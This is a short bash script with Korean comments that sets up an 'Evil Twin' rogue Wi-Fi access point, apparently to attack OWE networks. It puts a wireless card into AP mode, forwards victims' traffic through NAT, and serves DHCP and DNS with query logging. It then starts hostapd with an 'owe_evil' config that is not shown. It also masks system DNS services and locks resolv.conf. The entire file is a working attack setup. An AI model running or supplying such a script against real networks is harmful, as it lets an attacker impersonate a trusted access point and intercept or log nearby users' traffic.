#!/bin/bash
echo "=== Evil Twin AP 시작 ==="

# 1. 기존 서비스 중지
sudo systemctl stop NetworkManager
sudo systemctl stop systemd-resolved
sudo pkill -9 dnsmasq
sudo pkill -9 hostapd

# 2. systemd-resolved 완전 비활성화
sudo systemctl disable systemd-resolved
sudo systemctl mask systemd-resolved

# 3. resolv.conf 고정
sudo rm -f /etc/resolv.conf
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
sudo chattr +i /etc/resolv.conf 2>/dev/null || true

# 4. AP 인터페이스 설정
echo "AP 인터페이스 설정..."
sudo ip link set wlxa047d7501f1d down
sudo iw dev wlxa047d7501f1d set type __ap
sudo ip addr add 192.168.100.1/24 dev wlxa047d7501f1d
sudo ip link set wlxa047d7501f1d up

# 5. NAT 설정
echo "NAT 설정..."
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o wlp0s20f3 -j MASQUERADE
sudo iptables -A FORWARD -i wlxa047d7501f1d -o wlp0s20f3 -j ACCEPT
sudo iptables -A FORWARD -i wlp0s20f3 -o wlxa047d7501f1d -m state --state RELATED,ESTABLISHED -j ACCEPT

# 6. dnsmasq 실행 (이제 53번 포트 사용 가능)
echo "DHCP/DNS 서버 시작..."
sudo dnsmasq \
  --no-daemon \
  --interface=wlxa047d7501f1d \
  --dhcp-range=192.168.100.100,192.168.100.200,2h \
  --dhcp-option=3,192.168.100.1 \
  --dhcp-option=6,192.168.100.1 \
  --no-resolv \
  --server=8.8.8.8 \
  --log-queries &

# 7. hostapd 실행
echo "AP 시작..."
sudo hostapd /home/seungbin/2winter5/owe_attack/owe_evil.conf
